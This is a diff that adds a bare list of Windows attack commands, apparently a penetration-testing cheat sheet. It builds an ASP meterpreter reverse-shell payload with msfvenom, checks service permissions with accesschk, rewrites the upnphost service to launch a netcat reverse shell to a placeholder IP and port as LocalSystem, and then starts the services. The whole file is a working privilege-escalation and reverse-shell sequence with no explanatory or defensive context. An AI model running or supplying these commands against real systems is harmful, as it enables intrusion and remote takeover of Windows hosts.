@@ -1,0 +1,23 @@
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp
+
+accesschk.exe -uwcqv "bob" * /accepteula
+
+accesschk.exe -ucqv SSDPSRV /accepteula
+
+accesschk.exe -ucqv upnphost /accepteula
+
+sc qc upnphost
+
+sc config upnphost binpath= "C:\inetpub\wwwroot\nc.exe -nv IP PORT -e C:\WINDOWS\System32\cmd.exe"
+
+sc qc upnphost
+
+sc config upnphost obj= ".\LocalSystem" password= ""
+
+sc config SSDPSRV start= auto
+
+net start SSDPSRV
+
+net start upnphost
+
+C:\inetpub\wwwroot\nc.exe -nv IP PORT -e C:\WINDOWS\System32\cmd.exe
